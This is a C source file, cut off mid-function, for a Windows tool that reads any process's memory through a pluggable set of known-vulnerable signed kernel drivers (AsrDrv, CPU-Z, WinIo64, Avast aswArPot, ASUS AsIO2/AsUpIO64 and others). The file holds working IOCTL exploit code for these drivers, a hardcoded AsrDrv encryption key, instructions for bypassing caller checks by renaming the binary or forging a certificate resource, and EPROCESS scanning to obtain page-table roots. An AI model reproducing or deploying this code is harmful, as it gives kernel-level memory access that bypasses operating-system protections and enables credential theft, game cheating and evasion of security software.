// layers.exe - independent three-layer virtual-memory access architecture.
//
//   定位层 (locator)     : obtain CR3 for a target process
//   翻译层 (translator)  : CR3 + VA -> PA using x64 4-level page tables
//   取数层 (fetcher)     : PA -> bytes via a pluggable physical-memory reader
//
// The three layers only meet through explicit structs/interfaces:
//   mb_phys_reader  (取数层 provider)        read(pa, buf, len)
//   mb_layer_translate(reader, cr3, va)      -> pa / page size
//   mb_layer_locate_cr3_*                    -> cr3
//   mb_layer_read_va(reader, cr3, va, ...)   -> bytes (composition)
//
// `--selftest-mock` verifies all three layers offline, with a synthetic physical
// memory containing a page table and a fake EPROCESS; no driver/admin required.
//
// Real 取数层 providers: cchwapi (0x8024003C), rtkio (0x80002000 map), eneio64
// (0x80102040 map); devices must already be loaded/opened (loading policy belongs
// to membridge.exe). More N-day backends can be added behind mb_phys_reader
// without touching locator/translator.
#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <psapi.h>
#include <bcrypt.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

// ---------------------------------------------------------------------------
// 取数层 (fetch layer): pluggable physical memory reader
// ---------------------------------------------------------------------------
typedef struct mb_phys_reader mb_phys_reader;
struct mb_phys_reader {
    const char *name;
    HANDLE dev;
    int mode;                 // 0 cchwapi, 1 rtkio, 2 eneio64, 3 mock, 4 asrdrv, 5 mrt, 6 cpuz
    uint8_t *mock_mem;
    uint64_t mock_size;
    uint32_t aux;             // provider-specific: e.g. CPU-Z expected page-first dword
    int (*read)(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size);
};

static int read_cchwapi(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size) {
    if (r->dev == INVALID_HANDLE_VALUE) return 0;
    uint32_t len = size + 0x14;
    uint8_t *b = (uint8_t *)malloc(len);
    if (!b) return 0;
    memset(b, 0, len);
    *(uint64_t *)(b + 8) = pa;
    *(uint32_t *)(b + 0x10) = size;
    DWORD ret = 0;
    BOOL ok = FALSE;
    for (int attempt = 0; attempt < 3 && !ok; attempt++) {
        ok = DeviceIoControl(r->dev, 0x8024003Cu, b, len, b, len, &ret, NULL);
        if (!ok) Sleep(30);
    }
    if (ok) memcpy(buf, b + 0x14, size);
    free(b);
    return ok ? 1 : 0;
}

static int read_rtkio(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size) {
    if (r->dev == INVALID_HANDLE_VALUE) return 0;
    uint64_t page = pa & ~0xFFFull;
    uint32_t off = (uint32_t)(pa & 0xFFF);
    uint32_t map_size = (off + size + 0xFFF) & ~0xFFFu;
    uint8_t in[16];
    uint64_t uva = 0;
    DWORD ret = 0;
    memset(in, 0, sizeof(in));
    *(uint64_t *)(in + 0) = page;
    *(uint32_t *)(in + 8) = map_size;
    if (!DeviceIoControl(r->dev, 0x80002000u, in, sizeof(in), &uva, sizeof(uva), &ret, NULL) || !uva)
        return 0;
    SIZE_T got = 0;
    return (ReadProcessMemory(GetCurrentProcess(), (LPCVOID)(uintptr_t)(uva + off), buf, size, &got) &&
            got == size) ? 1 : 0;
}

static int read_eneio64(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size) {
    if (r->dev == INVALID_HANDLE_VALUE) return 0;
    uint8_t in[40], out[40];
    DWORD ret = 0;
    memset(in, 0, sizeof(in));
    memset(out, 0, sizeof(out));
    *(uint64_t *)(in + 0) = size;
    *(uint64_t *)(in + 8) = pa;
    if (!DeviceIoControl(r->dev, 0x80102040u, in, sizeof(in), out, sizeof(out), &ret, NULL))
        return 0;
    uint64_t cands[3] = { *(uint64_t *)(out + 24), *(uint64_t *)(out + 16), *(uint64_t *)(out + 32) };
    for (int i = 0; i < 3; i++) {
        if (cands[i] < 0x10000) continue;
        SIZE_T got = 0;
        if (ReadProcessMemory(GetCurrentProcess(), (LPCVOID)(uintptr_t)cands[i], buf, size, &got) &&
            got == size)
            return 1;
    }
    return 0;
}

static int read_mock(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size) {
    if (!r->mock_mem || pa > r->mock_size || size > r->mock_size - pa) return 0;
    memcpy(buf, r->mock_mem + pa, size);
    return 1;
}

// ---- 取数层 provider: CPU-Z 1.52 cpuz family physical dword read ----
// IOCTL 0x9C402708: input {u32 address; u32 expected_first_dword_of_page};
// output {u32 value}. Driver maps (address & ~0xFFF), requires the page's
// first dword to equal expected (r->aux), then returns the dword at address.
static int cpuz_build_request(uint64_t pa, uint32_t expected, uint32_t out[2]) {
    if (!out) return 0;
    out[0] = (uint32_t)pa;
    out[1] = expected;
    return 1;
}

static int read_cpuz(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size) {
    if (r->dev == INVALID_HANDLE_VALUE || !buf || !size) return 0;
    uint8_t *out = (uint8_t *)buf;
    uint32_t done = 0;
    while (done < size) {
        uint64_t cur = pa + done;
        uint32_t page_off = (uint32_t)(cur & 0xFFF);
        uint32_t in[2];
        uint32_t outv[2] = { 0, 0 };
        DWORD ret = 0;
        if (!cpuz_build_request(cur, r->aux, in)) return 0;
        if (!DeviceIoControl(r->dev, 0x9C402708u, in, sizeof(in), outv, sizeof(outv), &ret, NULL))
            return 0;
        uint32_t chunk = 4 - (page_off & 3);
        if (chunk > size - done) chunk = size - done;
        if (chunk > 0x1000 - page_off) chunk = 0x1000 - page_off;
        uint32_t val = outv[0] >> ((page_off & 3) * 8);
        for (uint32_t i = 0; i < chunk; i++) out[done + i] = (uint8_t)(val >> (i * 8));
        done += chunk;
    }
    return 1;
}

// ---- 取数层 provider: ASRock AsrDrv(2).sys (CVE-2020-15368 family) ----
// Outer IOCTL 0x22EC00 with AES-256-CBC payload; opcode 0x22E808 = physical read.
#pragma pack(push, 1)
typedef struct { WORD pad; DWORD iv_size; BYTE iv[21]; BYTE key[16]; BYTE pad2[3]; } asr_hdr;
typedef struct { DWORD cmd_size; WORD pad; } asr_footer;
typedef union { BYTE c[24]; WORD w[12]; DWORD d[6]; UINT64 q[3]; } asr_args;
typedef struct { UINT opcode; int pad; asr_args args; } asr_cmd;
#pragma pack(pop)

static int asr_encrypt(const asr_cmd *cmd, BYTE **out_buf, DWORD *out_len) {
    asr_hdr hdr;
    memset(&hdr, 0, sizeof(hdr));
    memset(hdr.iv, 0x69, sizeof(hdr.iv));
    memset(hdr.key, 0x69, sizeof(hdr.key));
    hdr.iv_size = sizeof(hdr.iv);
    BYTE enc_key[32];
    memset(enc_key, 0, sizeof(enc_key));
    memcpy(enc_key, "C110DD4FE9434147B92A5A1E3FDBF29A", 32);
    memcpy(&enc_key[13], hdr.key, 16);

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) < 0) return 0;
    if (BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, enc_key, sizeof(enc_key), 0) < 0) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return 0;
    }
    BYTE cipher[128];
    ULONG cb = 0;
    BYTE iv[16];
    memcpy(iv, hdr.iv, sizeof(iv));
    NTSTATUS st = BCryptEncrypt(hKey, (PUCHAR)cmd, sizeof(*cmd), NULL, iv, sizeof(iv),
                                cipher, sizeof(cipher), &cb, BCRYPT_BLOCK_PADDING);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    if (st < 0) return 0;
    DWORD total = (DWORD)(sizeof(hdr) + cb + sizeof(asr_footer));
    BYTE *b = (BYTE *)calloc(1, total);
    if (!b) return 0;
    memcpy(b, &hdr, sizeof(hdr));
    memcpy(b + sizeof(hdr), cipher, cb);
    asr_footer *f = (asr_footer *)(b + total - sizeof(asr_footer));
    f->cmd_size = cb;
    *out_buf = b;
    *out_len = total;
    return 1;
}

static int asrdrv_build_read_cmd(uint64_t pa, uint32_t size, void *buf, asr_cmd *cmd) {
    if (!cmd || !buf || !size) return 0;
    memset(cmd, 0, sizeof(*cmd));
    cmd->opcode = 0x22E808u;                 // OPCODE_READ_PHYSMEM
    cmd->args.q[0] = pa;
    cmd->args.d[2] = size;                   // length
    cmd->args.d[3] = 0;                      // byte granularity
    cmd->args.q[2] = (UINT64)(uintptr_t)buf; // driver writes to this user buffer
    return 1;
}

static int read_asrdrv(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size) {
    if (r->dev == INVALID_HANDLE_VALUE || !buf || !size) return 0;
    asr_cmd cmd;
    if (!asrdrv_build_read_cmd(pa, size, buf, &cmd)) return 0;
    BYTE *in = NULL;
    DWORD inlen = 0;
    if (!asr_encrypt(&cmd, &in, &inlen)) return 0;
    BYTE out[0x40];
    DWORD ret = 0;
    BOOL ok = DeviceIoControl(r->dev, 0x22EC00u, in, inlen, out, sizeof(out), &ret, NULL);
    free(in);
    return ok ? 1 : 0;
}

// ---- 取数层 provider: FireEye/fekern MRT (SYSTEM-only ACL) ----
// MRT_IOCTL_READ_PHYSICALMEMORY 0x70F8800C: input 16B {u64 PA; u32 size; u32 flags};
// output = size bytes (MmCopyMemory(..., MM_COPY_MEMORY_PHYSICAL)).
static int mrt_build_request(uint64_t pa, uint32_t size, uint8_t out[16]) {
    if (!out || !size) return 0;
    memset(out, 0, 16);
    *(uint64_t *)(out + 0) = pa;
    *(uint32_t *)(out + 8) = size;
    *(uint32_t *)(out + 12) = 0;
    return 1;
}

static int read_mrt(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size) {
    if (r->dev == INVALID_HANDLE_VALUE || !buf || !size) return 0;
    uint8_t in[16];
    DWORD ret = 0;
    if (!mrt_build_request(pa, size, in)) return 0;
    return DeviceIoControl(r->dev, 0x70F8800Cu, in, sizeof(in), buf, size, &ret, NULL) ? 1 : 0;
}

// ---- 取数层 provider: ASUS AsUpIO64 (EZ Update 3.00.03) physical map ----
// Device \\.\AsUpdateio. IRP_MJ_CREATE checks that the current process image
// path contains "\PEUPDATER.EXE" (copy/rename layers.exe to PEUPDATER.EXE).
// IOCTL 0xA040A480 (static-derived from FUN_000117f4):
//   input 24B {u32 interfaceType; u32 busNumber; u64 phys_start; u32 addressSpace; u32 size}
//   output  {u32 user_va}  (driver ZwMapViewOfSection(\Device\PhysicalMemory))
// NOTE: statically derived; behavior needs dynamic verification once loaded.
static int asupio64_build_map_request(uint64_t pa, uint32_t size, uint8_t out[24]) {
    if (!out || !size) return 0;
    uint64_t page = pa & ~0xFFFull;
    uint64_t end = pa + size;
    uint64_t page_end = (end + 0xFFF) & ~0xFFFull;
    uint64_t map_size = page_end - page;
    if (map_size > 0x1000000) return 0;
    memset(out, 0, 24);
    *(uint32_t *)(out + 0) = 1;                 // InterfaceType = Internal
    *(uint32_t *)(out + 4) = 0;                 // BusNumber
    *(uint64_t *)(out + 8) = page;              // physical start (4KB aligned)
    *(uint32_t *)(out + 16) = 0;                // AddressSpace = memory
    *(uint32_t *)(out + 20) = (uint32_t)map_size;
    return 1;
}

static int read_asupio64(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size) {
    if (r->dev == INVALID_HANDLE_VALUE || !buf || !size) return 0;
    uint8_t in[24];
    uint8_t out[8];
    DWORD ret = 0;
    if (!asupio64_build_map_request(pa, size, in)) return 0;
    memset(out, 0, sizeof(out));
    if (!DeviceIoControl(r->dev, 0xA040A480u, in, sizeof(in), out, sizeof(out), &ret, NULL))
        return 0;
    uint64_t uva = *(uint64_t *)out;
    if (uva < 0x10000) {
        uint32_t uva32 = *(uint32_t *)out;
        if (uva32 < 0x10000) return 0;
        uva = uva32;
    }
    memcpy(buf, (void *)(uintptr_t)(uva + (pa & 0xFFF)), size);
    return 1;
}

// ---- 取数层 provider: ASUS AsIO2 (gate bypass via ASUSCERT resource) ----
// Device \\.\Asusgio2. Gate reads current process image PE, finds resource
// "ASUSCERT" (size <=16), AES-128-encrypts the data and compares qword with
// PE TimeDateStamp. We build layers_asio2.exe with:
//   ASUSCERT data = AES_dec(0), PE TimeDateStamp = 0  -> gate passes.
// Physical map IOCTL 0xA040A480 (64-bit struct 0x28):
//   +0x00 u64 size; +0x08 u64 phys_start; +0x10 section_handle_out;
//   +0x18 user_va_out.
static int asio2_build_map_request(uint64_t pa, uint32_t size, uint8_t out[0x28]) {
    if (!out || !size) return 0;
    uint64_t page = pa & ~0xFFFull;
    uint64_t end = pa + size;
    uint64_t page_end = (end + 0xFFF) & ~0xFFFull;
    uint64_t map_size = page_end - page;
    if (map_size > 0x1000000) return 0;
    memset(out, 0, 0x28);
    *(uint64_t *)(out + 0x00) = map_size;   // size
    *(uint64_t *)(out + 0x08) = page;       // physical start
    *(uint64_t *)(out + 0x10) = 0;          // section handle out
    *(uint64_t *)(out + 0x18) = 0;          // user VA out
    return 1;
}

static int read_asio2(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size) {
    if (r->dev == INVALID_HANDLE_VALUE || !buf || !size) return 0;
    uint8_t req[0x28];
    if (!asio2_build_map_request(pa, size, req)) return 0;
    DWORD ret = 0;
    if (!DeviceIoControl(r->dev, 0xA040A480u, req, sizeof(req), req, sizeof(req), &ret, NULL))
        return 0;
    uint64_t uva = *(uint64_t *)(req + 0x18);
    if (uva < 0x10000) return 0;
    memcpy(buf, (void *)(uintptr_t)(uva + (pa & 0xFFF)), size);
    return 1;
}

// ---- 取数层 provider: Avast aswArPot (anti-rootkit) physical read ----
// Device \Device\<prefix>SP_ArPot2; IOCTL 0x9988C408 (custom):
//   input 12 bytes {u32 phys; u32 reserved; u32 size}; output = size bytes.
// Driver (FUN_140023540) MmMapIoSpace's the 32-bit PA and copies size bytes
// to the output buffer. 32-bit PA limit. Dynamic test pending (signed driver).
static int aswarpot_build_read_request(uint32_t pa, uint32_t size, uint8_t out[12]) {
    if (!out || !size) return 0;
    memset(out, 0, 12);
    *(uint32_t *)(out + 0) = pa;
    *(uint32_t *)(out + 4) = 0;
    *(uint32_t *)(out + 8) = size;
    return 1;
}

static int read_aswarpot(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size) {
    if (r->dev == INVALID_HANDLE_VALUE || !buf || !size) return 0;
    uint8_t *out = (uint8_t *)buf;
    uint32_t done = 0;
    while (done < size) {
        uint64_t cur = pa + done;
        if (cur > 0xFFFFFFFFull) return 0;  // driver takes a 32-bit PA
        uint32_t chunk = size - done;
        if (chunk > 0x1000) chunk = 0x1000;
        uint8_t in[12];
        DWORD ret = 0;
        if (!aswarpot_build_read_request((uint32_t)cur, chunk, in)) return 0;
        if (!DeviceIoControl(r->dev, 0x9988C408u, in, sizeof(in), out + done, chunk, &ret, NULL))
            return 0;
        if (ret != chunk) return 0;
        done += chunk;
    }
    return 1;
}

// ---- 取数层 provider: WinIo64 (classic physical map driver) ----
// Device \\.\WinIo. IOCTL_WINIO_MAPPHYSTOLIN (0x80102040):
//   input/output 0x28: {u64 size; u64 phys_start; HANDLE section_handle;
//                       u64 user_va; u64 object}
// Unmap: 0x80102044 (same buffer). The driver maps \Device\PhysicalMemory.
static int winio64_build_map_request(uint64_t pa, uint32_t size, uint8_t out[0x28]) {
    if (!out || !size) return 0;
    uint64_t page = pa & ~0xFFFull;
    uint64_t end = pa + size;
    uint64_t page_end = (end + 0xFFF) & ~0xFFFull;
    uint64_t map_size = page_end - page;
    if (map_size > 0x1000000) return 0;
    memset(out, 0, 0x28);
    *(uint64_t *)(out + 0x00) = map_size;
    *(uint64_t *)(out + 0x08) = page;
    return 1;
}

static int read_winio64(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size) {
    if (r->dev == INVALID_HANDLE_VALUE || !buf || !size) return 0;
    uint8_t req[0x28];
    DWORD ret = 0;
    if (!winio64_build_map_request(pa, size, req)) return 0;
    if (!DeviceIoControl(r->dev, 0x80102040u, req, sizeof(req), req, sizeof(req), &ret, NULL))
        return 0;
    uint64_t uva = *(uint64_t *)(req + 0x18);
    if (uva < 0x10000) return 0;
    memcpy(buf, (void *)(uintptr_t)(uva + (pa & 0xFFF)), size);
    req[0x00] = 0;  // keep section handle/object/user_va for unmap
    DeviceIoControl(r->dev, 0x80102044u, req, sizeof(req), req, sizeof(req), &ret, NULL);
    return 1;
}

static int reader_open(mb_phys_reader *r, const char *kind, const char *device) {
    memset(r, 0, sizeof(*r));
    r->dev = INVALID_HANDLE_VALUE;
    if (_stricmp(kind, "mock") == 0) {
        r->name = "mock";
        r->mode = 3;
        r->read = read_mock;
        return 1;
    }
    if (_stricmp(kind, "cchwapi") == 0) {
        r->name = "cchwapi";
        r->mode = 0;
        r->read = read_cchwapi;
        r->dev = CreateFileA(device ? device : "\\\\.\\CCHWAPI",
                             GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    } else if (_stricmp(kind, "rtkio") == 0) {
        r->name = "rtkio";
        r->mode = 1;
        r->read = read_rtkio;
        r->dev = CreateFileA(device ? device : "\\\\.\\rtkio",
                             GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    } else if (_stricmp(kind, "eneio64") == 0) {
        r->name = "eneio64";
        r->mode = 2;
        r->read = read_eneio64;
        r->dev = CreateFileA(device ? device : "\\\\.\\GLCKIo",
                             GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    } else if (_stricmp(kind, "asrdrv") == 0) {
        r->name = "asrdrv";
        r->mode = 4;
        r->read = read_asrdrv;
        const char *names[] = { device, "\\\\.\\AsrDrv109", "\\\\.\\GlobalRoot\\Device\\AsrDrv109",
                                "\\\\.\\Global\\AsrDrv109", "\\\\.\\GlobalRoot\\Device\\AsrDrv104" };
        for (int i = 0; i < (int)(sizeof(names) / sizeof(names[0])) && r->dev == INVALID_HANDLE_VALUE; i++) {
            if (!names[i] || !names[i][0]) continue;
            r->dev = CreateFileA(names[i], GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
                                 NULL, OPEN_EXISTING, 0, NULL);
        }
    } else if (_stricmp(kind, "mrt") == 0) {
        r->name = "mrt";
        r->mode = 5;
        r->read = read_mrt;
        r->dev = CreateFileA(device ? device : "\\\\.\\fekern_00",
                             GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
                             NULL, OPEN_EXISTING, 0, NULL);
    } else if (_stricmp(kind, "cpuz") == 0) {
        r->name = "cpuz";
        r->mode = 6;
        r->read = read_cpuz;
        const char *names[] = { device, "\\\\.\\Global\\CPUZ152", "\\\\.\\CPUZ152" };
        for (int i = 0; i < (int)(sizeof(names) / sizeof(names[0])) && r->dev == INVALID_HANDLE_VALUE; i++) {
            if (!names[i] || !names[i][0]) continue;
            r->dev = CreateFileA(names[i], GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
                                 NULL, OPEN_EXISTING, 0, NULL);
        }
    } else if (_stricmp(kind, "asupio64") == 0) {
        r->name = "asupio64";
        r->mode = 7;
        r->read = read_asupio64;
        r->dev = CreateFileA(device ? device : "\\\\.\\AsUpdateio",
                             GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
                             NULL, OPEN_EXISTING, 0, NULL);
        if (r->dev == INVALID_HANDLE_VALUE)
            fprintf(stderr, "[HINT] AsUpIO64 gate: run layers.exe renamed/copied as PEUPDATER.EXE\n");
    } else if (_stricmp(kind, "asio2") == 0) {
        r->name = "asio2";
        r->mode = 8;
        r->read = read_asio2;
        r->dev = CreateFileA(device ? device : "\\\\.\\Asusgio2",
                             GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
                             NULL, OPEN_EXISTING, 0, NULL);
        if (r->dev == INVALID_HANDLE_VALUE)
            fprintf(stderr, "[HINT] AsIO2 gate: run bin\\layers_asio2.exe (ASUSCERT resource + timestamp 0)\n");
    } else if (_stricmp(kind, "aswarpot") == 0) {
        r->name = "aswarpot";
        r->mode = 9;
        r->read = read_aswarpot;
        const char *candidates[] = { "\\\\.\\aswSP_ArPot2", "\\\\.\\avastSP_ArPot2", "\\\\.\\aswSP_ArPot" };
        if (device) {
            r->dev = CreateFileA(device, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
                                 NULL, OPEN_EXISTING, 0, NULL);
        } else {
            for (int ci = 0; ci < 3 && r->dev == INVALID_HANDLE_VALUE; ci++)
                r->dev = CreateFileA(candidates[ci], GENERIC_READ | GENERIC_WRITE,
                                     FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
        }
        if (r->dev == INVALID_HANDLE_VALUE)
            fprintf(stderr, "[HINT] aswArPot device not found (try --device \\\\.\\aswSP_ArPot2)\n");
    } else if (_stricmp(kind, "winio64") == 0) {
        r->name = "winio64";
        r->mode = 10;
        r->read = read_winio64;
        r->dev = CreateFileA(device ? device : "\\\\.\\WinIo",
                             GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
                             NULL, OPEN_EXISTING, 0, NULL);
        if (r->dev == INVALID_HANDLE_VALUE)
            fprintf(stderr, "[HINT] WinIo64 device not found (need WinIo64.sys loaded)\n");
    } else {
        fprintf(stderr, "[ERR] unknown reader '%s' (mock|cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2|aswarpot|winio64)\n", kind ? kind : "");
        return 0;
    }
    if (r->dev == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[ERR] CreateFile(%s) failed err=%lu\n", device ? device : r->name, GetLastError());
        return 0;
    }
    return 1;
}

static void reader_close(mb_phys_reader *r) {
    if (r->dev != INVALID_HANDLE_VALUE && r->dev) CloseHandle(r->dev);
    r->dev = INVALID_HANDLE_VALUE;
    r->mock_mem = NULL;
}

// ---------------------------------------------------------------------------
// 翻译层 (translation layer): CR3 + VA -> PA, 4-level x64 page tables
// ---------------------------------------------------------------------------
#define MB_MAX_PHYS 0x10000000000ull   // 1 TiB sanity limit
#define MB_KVA_MIN  0xFFFF800000000000ull

static int phys_read_u64(mb_phys_reader *r, uint64_t pa, uint64_t *out) {
    if (pa >= MB_MAX_PHYS) return 0;
    return r->read(r, pa, out, 8);
}

// returns 1 on success; out_pa = physical address of VA, out_page_size = 0x1000/0x200000/0x40000000
static int mb_layer_translate(mb_phys_reader *r, uint64_t cr3, uint64_t va,
                              uint64_t *out_pa, uint64_t *out_page_size) {
    uint64_t e = 0;
    uint64_t pml4 = cr3 & 0x000FFFFFFFFFF000ull;
    if (!phys_read_u64(r, pml4 + (((va >> 39) & 0x1FF) * 8), &e) || !(e & 1)) return 0;
    uint64_t pdpt = e & 0x000FFFFFFFFFF000ull;
    if (!phys_read_u64(r, pdpt + (((va >> 30) & 0x1FF) * 8), &e) || !(e & 1)) return 0;
    if (e & 0x80) {
        *out_pa = (e & 0x000FFFFFC0000000ull) + (va & 0x3FFFFFFFull);
        *out_page_size = 0x40000000ull;
        return (*out_pa < MB_MAX_PHYS);
    }
    uint64_t pd = e & 0x000FFFFFFFFFF000ull;
    if (!phys_read_u64(r, pd + (((va >> 21) & 0x1FF) * 8), &e) || !(e & 1)) return 0;
    if (e & 0x80) {
        *out_pa = (e & 0x000FFFFFFFE00000ull) + (va & 0x1FFFFFull);
        *out_page_size = 0x200000ull;
        return (*out_pa < MB_MAX_PHYS);
    }
    uint64_t pt = e & 0x000FFFFFFFFFF000ull;
    if (!phys_read_u64(r, pt + (((va >> 12) & 0x1FF) * 8), &e) || !(e & 1)) return 0;
    *out_pa = (e & 0x000FFFFFFFFFF000ull) + (va & 0xFFFull);
    *out_page_size = 0x1000;
    return (*out_pa < MB_MAX_PHYS);
}

// ---------------------------------------------------------------------------
// 定位层 (locator): target process -> CR3
// ---------------------------------------------------------------------------
// Known Win11 26200 _EPROCESS offsets (validated in earlier rounds):
#define EP_DTB     0x28ull
#define EP_PID     0x1D0ull
#define EP_NAME    0x338ull

static int mb_layer_locate_cr3_explicit(uint64_t cr3, uint64_t *out_cr3) {
    if (!cr3 || (cr3 & 0xFFF)) return 0;
    *out_cr3 = cr3;
    return 1;
}

// Physical-scan locator: independent from any kernel-VA reader. Scans a physical
// range for an EPROCESS whose PID and ImageFileName match, then reads
// DirectoryTableBase (+0x28). This is the locator strategy that only needs the
// 取数层 reader.
static int mb_layer_locate_cr3_scan(mb_phys_reader *r, uint64_t range_start, uint64_t range_size,
                                    uint32_t pid, const char *image_name,
                                    uint64_t *out_cr3, uint64_t *out_eproc_pa) {
    const uint32_t chunk = 0x100000;
    if (range_size < 0x1000) return 0;
    uint8_t *buf = (uint8_t *)malloc(chunk);
    if (!buf) return 0;
    uint8_t name[15];
    memset(name, 0, sizeof(name));
    size_t nlen = strlen(image_name);
    if (nlen > 15) nlen = 15;
    memcpy(name, image_name, nlen);

    uint64_t end = range_start + range_size;
    int found = 0;
    for (uint64_t pa = range_start; pa < end && !found; pa += chunk) {
        uint32_t want = (uint32_t)((end - pa) < chunk ? (end - pa) : chunk);
        if (want < 0x1000) break;
        if (!r->read(r, pa, buf, want)) continue;
        for (uint32_t off = 0; off + EP_NAME + 2 <= want; off++) {
            if (memcmp(buf + off, name, nlen) != 0) continue;
            if (off < EP_NAME) continue;
            uint64_t base_off = off - EP_NAME;
            if (base_off + EP_DTB + 8 > want) continue;
            uint64_t dtb = 0;
            uint32_t pid_v = 0;
            memcpy(&dtb, buf + base_off + EP_DTB, 8);
            memcpy(&pid_v, buf + base_off + EP_PID, 4);
            if (pid_v != pid) continue;
            if (!dtb || (dtb & 0xFFF) || dtb >= MB_MAX_PHYS) continue;
            *out_cr3 = dtb;
            if (out_eproc_pa) *out_eproc_pa = pa + base_off;
            found = 1;
            break;
        }
    }
    free(buf);
    return found;
}

// ---------------------------------------------------------------------------
// 定位层策略 3: kernel-VA reader (KKYUM) + 进程链表遍历
// 这条路径不依赖取数层（物理读）；只依赖内核 VA 读 provider。
// ---------------------------------------------------------------------------
typedef struct mb_kernel_reader mb_kernel_reader;
struct mb_kernel_reader {
    void *ctx;
    int (*read)(mb_kernel_reader *kr, uint64_t va, void *buf, uint32_t size);
};

// Walk System EPROCESS -> ActiveProcessLinks list -> target EPROCESS -> CR3.
// Offsets are supplied by the caller (Win11 26200: pid=0x1D0, links=0x1D8, dtb=0x28).
static int mb_layer_locate_cr3_kernel(mb_kernel_reader *kr, uint64_t system_eproc_va, uint32_t pid,
                                      uint32_t links_off, uint32_t pid_off, uint32_t dtb_off,
                                      uint64_t *out_cr3, uint64_t *out_eproc) {
    uint64_t dtb = 0;
    if (pid == 4) {
        if (!kr->read(kr, system_eproc_va + dtb_off, &dtb, 8) || !dtb || (dtb & 0xFFF)) return 0;
        *out_cr3 = dtb;
        if (out_eproc) *out_eproc = system_eproc_va;
        return 1;
    }
    uint64_t start = system_eproc_va + links_off, link = 0;
    if (!kr->read(kr, start, &link, 8) || link < 0xFFFF800000000000ull) return 0;
    for (int i = 0; i < 4096; i++) {
        uint64_t node = link - links_off;
        uint32_t v = 0;
        if (!kr->read(kr, node + pid_off, &v, 4)) return 0;
        if (v == pid) {
            if (!kr->read(kr, node + dtb_off, &dtb, 8) || !dtb || (dtb & 0xFFF)) return 0;
            *out_cr3 = dtb;
            if (out_eproc) *out_eproc = node;
            return 1;
        }
        uint64_t next = 0;
        if (!kr->read(kr, node + links_off, &next, 8)) return 0;
        if (next == start) return 0;
        link = next;
        if (link < 0xFFFF800000000000ull) return 0;
    }
    return 0;
}

// Mock kernel VA memory, used by --selftest-mock.
typedef struct { uint8_t *mem; uint64_t base; uint64_t size; } mock_kva;
static int mock_kva_read(mb_kernel_reader *kr, uint64_t va, void *buf, uint32_t size) {
    mock_kva *m = (mock_kva *)kr->ctx;
    if (!m || !m->mem || va < m->base) return 0;
    uint64_t off = va - m->base;
    if (off > m->size || size > m->size - off) return 0;
    memcpy(buf, m->mem + off, size);
    return 1;
}

// Real kernel-reader provider: KKYUM.sys device (IOCTL 0x22265C).
static HANDLE g_kkyum = INVALID_HANDLE_VALUE;
static int kkyum_open(const char *device) {
    const char *path = (device && device[0]) ? device : "\\\\.\\KKYUM";
    g_kkyum = CreateFileA(path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    return g_kkyum != INVALID_HANDLE_VALUE;
}
static int kkyum_kread(mb_kernel_reader *kr, uint64_t va, void *buf, uint32_t size) {
    (void)kr;
    if (g_kkyum == INVALID_HANDLE_VALUE) return 0;
    uint8_t in[32];
    DWORD ret = 0;
    memset(in, 0, sizeof(in));
    *(uint32_t *)(in + 0) = GetCurrentProcessId();
    *(uint32_t *)(in + 4) = 1;
    *(uint64_t *)(in + 8) = va;
    *(uint64_t *)(in + 16) = (uint64_t)(uintptr_t)buf;
    *(uint64_t *)(in + 24) = size;
    return DeviceIoControl(g_kkyum, 0x22265Cu, in, sizeof(in), NULL, 0, &ret, NULL) ? 1 : 0;
}

// ---------------------------------------------------------------------------
// 定位层策略 3 辅助: ntoskrnl base + PsInitialSystemProcess export
// ---------------------------------------------------------------------------
static uint32_t nt_rva_to_off(uint8_t *img, uint32_t size, uint32_t rva) {
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)img;
    if (size < sizeof(IMAGE_DOS_HEADER) || dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    IMAGE_NT_HEADERS64 *nt = (IMAGE_NT_HEADERS64 *)(img + dos->e_lfanew);
    if ((uint8_t *)nt + sizeof(IMAGE_NT_HEADERS64) > img + size) return 0;
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (rva >= sec[i].VirtualAddress &&
            rva < sec[i].VirtualAddress + sec[i].Misc.VirtualSize)
